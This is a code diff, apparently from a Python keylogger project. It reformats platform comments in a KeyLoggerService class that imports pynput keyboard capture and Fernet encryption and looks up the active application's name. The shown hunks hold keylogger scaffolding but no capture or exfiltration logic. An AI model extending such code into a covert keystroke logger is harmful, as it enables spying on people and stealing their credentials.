@@ -6,10 +6,9 @@ from pynput import keyboard
 from pynput.keyboard import Key
 from cryptography.fernet import Fernet
 import platform
-# Windows
-# import win32gui
-# macOS
-from AppKit import NSWorkspace
+# import win32gui # Windows
+from AppKit import NSWorkspace # macOS
+
 
 class KeyLoggerService:
     def __init__(self):
@@ -48,15 +47,13 @@ class KeyLoggerService:
 
     @staticmethod
     def get_active_application():
-        # Windows
-        # if platform.system() == "Windows":
-        # hwnd = win32gui.GetForegroundWindow()
-        # return win32gui.GetWindowText(hwnd) or "Unknown"
+        # if platform.system() == "Windows": # Windows
+        # hwnd = win32gui.GetForegroundWindow() # Windows
+        # return win32gui.GetWindowText(hwnd) or "Unknown" # Windows
 
-        # macOS
-        if platform.system() == "Darwin":
-            active_app = NSWorkspace.sharedWorkspace().activeApplication()
-            return active_app.get("NSApplicationName", "Unknown")
+        if platform.system() == "Darwin": # macOS
+            active_app = NSWorkspace.sharedWorkspace().activeApplication() # macOS
+            return active_app.get("NSApplicationName", "Unknown") # macOS
         return "Unsupported"
 
     def format_logs(self):
